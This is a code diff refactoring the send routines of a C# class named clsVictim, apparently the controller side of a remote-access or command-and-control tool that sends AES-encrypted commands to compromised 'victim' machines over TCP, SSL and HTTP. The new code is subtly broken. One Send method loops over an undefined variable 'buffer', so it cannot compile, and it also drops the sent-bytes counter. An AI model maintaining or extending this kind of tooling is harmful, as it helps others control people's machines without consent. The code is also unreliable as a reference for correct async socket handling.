@@ -39,8 +39,8 @@ public class clsVictim
     public int SentBytes { get { return _sent_bytes; } }
 
     //Lock
-    private readonly object _tcpWriteLock = new object();
-    private readonly object _sslWriteLock = new object();
+    private readonly SemaphoreSlim _tcpSemaphore = new SemaphoreSlim(1, 1);
+    private readonly SemaphoreSlim _sslSemaphore = new SemaphoreSlim(1, 1);
 
     //FOLDER
     public string dir_victim;
@@ -92,27 +92,32 @@ public class clsVictim
     {
         Send(Command, Param, Encoding.UTF8.GetBytes(data));
     }
-    public void Send(int Command, int Param, byte[] buffer)
+    public async void Send(int Command, int Param, byte[] buffer)
     {
         if (buffer != null)
         {
             try
             {
                 buffer = new clsDSP((byte)Command, (byte)Param, buffer).GetBytes();
-                
-                lock(_tcpWriteLock)
+
+                await _tcpSemaphore.WaitAsync();
+
+                try
                 {
-                    socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
+                    int nOffset = 0;
+                    while (nOffset < buffer.Length)
                     {
-                        try
-                        {
-                            socket.EndSend(ar);
-                        }
-                        catch (Exception ex)
-                        {
-                            clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
-                        }
-                    }), buffer);
+                        int nSent = await socket.SendAsync(new ArraySegment<byte>(buffer, nOffset, buffer.Length - nOffset), SocketFlags.None);
+                        nOffset += nSent;
+                    }
+                }
+                catch (Exception ex)
+                {
+                    clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
+                }
+                finally
+                {
+                    _tcpSemaphore.Release();
                 }
 
                 clsStore.sent_bytes += buffer.Length;
@@ -123,31 +128,29 @@ public class clsVictim
             }
         }
     }
-    public void Send(byte[] abBuffer)
+    public async Task Send(byte[] abBuffer)
     {
         if (abBuffer == null)
             return;
 
+        await _tcpSemaphore.WaitAsync();
+
         try
         {
-            lock(_tcpWriteLock)
+            int nOffset = 0;
+            while (nOffset < buffer.Length)
             {
-                socket.BeginSend(abBuffer, 0, abBuffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
-                {
-                    try
-                    {
-                        clsStore.sent_bytes += socket.EndSend(ar);
-                    }
-                    catch (Exception ex)
-                    {
-                        clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
-                    }
-                }), abBuffer);
+                int nSent = await socket.SendAsync(new ArraySegment<byte>(buffer, nOffset, buffer.Length - nOffset), SocketFlags.None);
+                nOffset += nSent;
             }
         }
         catch (Exception ex)
         {
             clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
+        }
+        finally
+        {
+            _tcpSemaphore.Release();
         }
     }
 
@@ -176,7 +179,7 @@ public class clsVictim
                 break;
             case enListenerProtocol.HTTP:
                 var listener = (clsHttpListener)m_listener;
-                var pkt = new clsHttpListener.clsHttpResp(2, 0, Encoding.UTF8.GetBytes(clsCrypto.AESEncrypt(command, _AES.key, _AES.iv)));
+                var pkt = new clsHttpResp(2, 0, Encoding.UTF8.GetBytes(clsCrypto.AESEncrypt(command, _AES.key, _AES.iv)));
                 fnEnqueue(pkt);
                 break;
         }
@@ -188,7 +191,7 @@ public class clsVictim
 
     public void fnSslSend(string szMsg) => fnSslSend(szMsg.Split('|'));
     public void fnSslSend(string[] asMsg) => fnSslSend(asMsg.ToList());
-    public void fnSslSend(List<string> lsMsg)
+    public async void fnSslSend(List<string> lsMsg)
     {
         string szMsg = string.Join("|", lsMsg);
         byte[] abMsg = Encoding.UTF8.GetBytes(szMsg);
@@ -196,29 +199,28 @@ public class clsVictim
         clsDSP dsp = new clsDSP(0, 0, abMsg);
         byte[] abBuffer = dsp.GetBytes();
 
-        fnSslSendRaw(abBuffer);
+        await fnSslSendRaw(abBuffer);
     }
 
     /// <summary>
     /// Send SSL raw data.
     /// </summary>
     /// <param name="abBuffer"></param>
-    public void fnSslSendRaw(byte[] abBuffer)
+    public async Task fnSslSendRaw(byte[] abBuffer)
     {
-        lock(_sslWriteLock)
+        await _sslSemaphore.WaitAsync();
+        try
         {
-            m_sslClnt.BeginWrite(abBuffer, 0, abBuffer.Length, new AsyncCallback((ar) =>
-            {
-                try
-                {
-                    m_sslClnt.EndWrite(ar);
-                    clsStore.sent_bytes += abBuffer.Length;
-                }
-                catch (Exception ex)
-                {
-
-                }
-            }), abBuffer);
+            await m_sslClnt.WriteAsync(abBuffer, 0, abBuffer.Length);
+            //await m_sslClnt.FlushAsync();
+        }
+        catch (Exception ex)
+        {
+            clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
+        }
+        finally
+        {
+            _sslSemaphore.Release();
         }
     }
 
@@ -226,14 +228,14 @@ public class clsVictim
     public void fnHttpSend(int nCmd, int nParam, string szMsg)
     {
         var listener = (clsHttpListener)m_listener;
-        var resp = new clsHttpListener.clsHttpResp(nCmd, nParam, szMsg);
+        var resp = new clsHttpResp(nCmd, nParam, szMsg);
         
         fnEnqueue(resp);
     }
     public void fnHttpSend(int nCmd, int nParam, byte[] abMsg)
     {
         var listener = (clsHttpListener)m_listener;
-        var resp = new clsHttpListener.clsHttpResp(nCmd, nParam, abMsg);
+        var resp = new clsHttpResp(nCmd, nParam, abMsg);
 
         fnEnqueue(resp);
     }
